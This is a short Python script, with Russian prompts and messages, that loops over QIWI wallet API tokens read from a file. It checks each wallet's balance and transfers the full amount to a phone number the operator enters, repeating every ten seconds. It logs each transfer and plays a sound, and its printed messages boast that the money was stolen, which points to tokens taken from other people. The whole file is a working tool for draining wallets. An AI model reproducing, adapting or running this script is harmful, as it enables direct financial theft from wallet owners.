from SimpleQIWI import *
from datetime import datetime
from colorama import init
init()
from colorama import Fore, Back, Style
import time
import pygame
pygame.init()
song = pygame.mixer.Sound('sound.mp3')
clock = pygame.time.Clock()

print (Fore.GREEN + " .::::::\ QIWI WALLET /::::::.")
summ = input(Fore.YELLOW + "Введите Ваш! Qiwi +7: ")
def EbatNihyiaQiwiPerevod():
    while True:
        lists = open('token.txt').read().split('\n')
        try:
            for tok in lists:
                api = QApi(token=tok, phone=summ)
                bal = api.balance
                if bal[0] > 1:
                    current_datetime = datetime.now()
                    api.pay(account=str(summ), amount=int(bal[0]), comment=' ')
                    print(Fore.YELLOW +  '!!!!!!! --- !!!! Скомуниздили ' + str(bal[0]) + " рублей !!!! --- !!!!!!!")
                    f = open('log.txt', 'a')
                    f.write('Перевод' + str(bal[0]))
                    f.close()
                    song.play()
                      
            else:
                    print(" .:: --- На балансе " + str(bal[0]) + " рублей --- ::.")
                    print (Fore.YELLOW + "....-=Ждем 10 секунд=-...")
        except ValueError:
            pass
            
        time.sleep(10)
        


EbatNihyiaQiwiPerevod()